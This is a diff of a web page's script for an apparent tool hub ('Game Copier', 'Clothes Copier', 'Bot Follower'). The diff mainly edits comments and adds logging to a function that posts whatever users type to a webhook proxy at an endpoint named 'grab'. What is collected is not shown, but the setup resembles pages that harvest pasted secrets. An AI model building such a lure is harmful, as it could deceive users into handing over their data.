@@ -335,14 +335,14 @@
   </div>
 
   <script>
-    // Your live Vercel proxy - this is the key line
+    // This is your LIVE Vercel proxy endpoint
     const PROXY_URL = "https://haychtools.vercel.app/api/grab";
 
-    // Paste your real YouTube video IDs here
+    // Replace with your real YouTube IDs
     const videos = {
-      game:    "dQw4w9WgXcQ",   // Game Copier tutorial
-      clothes: "dQw4w9WgXcQ",   // Clothes Copier tutorial
-      bot:     "dQw4w9WgXcQ"    // Bot Follower tutorial
+      game:    "dQw4w9WgXcQ",
+      clothes: "dQw4w9WgXcQ",
+      bot:     "dQw4w9WgXcQ"
     };
 
     function openVideo(tool) {
@@ -361,7 +361,6 @@
       if (e.target === document.getElementById('videoModal')) closeVideo();
     });
 
-    // YOUR UPDATED FUNCTION - plugged in exactly as you gave
     async function sendToWebhook(tool) {
       let inputId, statusId;
       if (tool === 'game') { inputId = 'gameInput'; statusId = 'gameStatus'; }
@@ -381,23 +380,28 @@
       status.style.color = "#4d9fff";
 
       try {
+        console.log("Attempting proxy call to:", PROXY_URL);
+        console.log("Sending data:", { tool, value: input });
+
         const res = await fetch(PROXY_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ tool, value: input })
         });
 
+        console.log("Proxy responded with status:", res.status);
+
         if (res.ok) {
           status.textContent = "Processed successfully!";
           status.style.color = "#00ff9d";
         } else {
           const errorText = await res.text();
-          status.textContent = "Failed - proxy error: " + errorText;
-          console.log("Proxy response:", errorText);
+          status.textContent = "Failed - proxy said: " + errorText;
+          console.log("Full proxy error response:", errorText);
         }
       } catch (err) {
-        status.textContent = "Failed - network issue";
-        console.error("Fetch error:", err);
+        status.textContent = "Failed - network/browser issue";
+        console.error("Full fetch crash:", err);
       }
     }
 
@@ -409,7 +413,7 @@
       window.scrollTo(0, 0);
     }
 
-    // Waves (hub)
+    // Waves, particles, dots animation (unchanged)
     const waveCanvas = document.getElementById("waves");
     const wctx = waveCanvas.getContext("2d");
     waveCanvas.width = window.innerWidth;
@@ -432,7 +436,6 @@
     }
     drawWaves();
 
-    // Mouse trail particles (hub)
     const pCanvas = document.getElementById("particles");
     const pctx = pCanvas.getContext("2d");
     pCanvas.width = window.innerWidth;
@@ -465,7 +468,6 @@
     }
     drawParticles();
 
-    // Floating dots for tools
     let dots = [];
     let dotsAnim;
     const dotsCanvas = document.getElementById('dots-canvas');
